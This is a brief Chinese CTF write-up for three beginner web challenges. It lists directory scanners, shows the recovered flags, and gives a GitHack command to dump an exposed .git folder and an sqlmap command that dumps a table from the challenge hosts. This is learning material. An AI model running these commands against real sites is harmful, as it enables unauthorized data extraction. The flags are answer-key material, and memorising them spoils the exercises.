# [第一章 web入门]常见的搜集
试了好些类似 dirsearch 的工具，都不好用，最后还是看的答案
- [dirsearch](https://github.com/maurosoria/dirsearch)：扫描网站目录
- [feroxbuster](https://github.com/epi052/feroxbuster)：扫描网站目录
- [ffuf](https://github.com/ffuf/ffuf)：扫描网站目录
- [gobuster](https://github.com/OJ/gobuster/releases/tag/v3.6.0)：扫描网站目录
- [common.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/common.txt): 常见目录文件名
反正最后就是要查出来几个文件
```
robots.txt -> flag1:n1book{info_1
index.php~ -> flag2:s_v3ry_im
.index.php.swp -> flag3:p0rtant_hack}

n1book{info_1s_v3ry_imp0rtant_hack}
```

# [第一章 web入门]粗心的小李
使用 GitHack 下载 .git 文件夹
```sh
'C:\Python27\python.exe' .\GitHack.py -u http://bd8453b7-fcb1-4725-8962-3bb1cb3dcef9.node5.buuoj.cn:81/.git
cd .\dist\bd8453b7-fcb1-4725-8962-3bb1cb3dcef9.node5.buuoj.cn_81\
git log
git show 213b7e386e9b0b406d91fae58bf8be11a58c3f88
```

# [第一章 web入门]SQL注入-1
使用 sqlmap
```sh
python .\sqlmap.py -u http://54313594-3a8c-4a9f-afdf-1c4c3a6d32a9.node5.buuoj.cn:81/index.php?id=1 --threads 10 -D note -T fl4g -C fllllag --dump
```
